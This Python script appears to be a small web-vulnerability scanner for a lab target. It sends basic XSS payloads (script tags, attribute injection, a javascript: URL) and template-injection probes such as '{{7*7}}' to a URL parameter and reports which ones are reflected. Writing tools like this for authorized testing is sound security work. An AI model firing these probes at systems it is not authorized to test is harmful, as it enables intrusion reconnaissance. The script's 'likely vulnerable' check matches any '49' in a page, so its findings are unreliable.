import requests

def test_xss(target_url):
    vuln_count = 0
    payloads = [
        # Basic XSS
        ("<script>alert(1)</script>", "script_tag"),
        ('" onmouseover="alert(1)"', "attribute_injection"),
        ("javascript:alert(1)", "protocol_handler"),
        # Template Injection
        ("{{7*7}}", "ssti"),
        ("${7*7}", "ssti_alt")
    ]
    
    for payload, payload_type in payloads:
        try:
            r = requests.get(f"{target_url}?input={payload}", timeout=5)
            if payload in r.text:
                print(f"[VULNERABLE] {payload_type}: {payload}")
                vuln_count = vuln_count + 1
            elif any(x in r.text for x in ["49", "alert(1)"]):
                print(f"[LIKELY VULN] {payload_type} (filter bypass)")
                vuln_count = vuln_count + 1
            else:
                print(f"[SAFE] {payload_type}")

        except Exception as e:
            print(f"[ERROR] {payload_type}: {str(e)}")

    return vuln_count

# a = test_xss("http://10.13.37.107/xss")
# print(a)

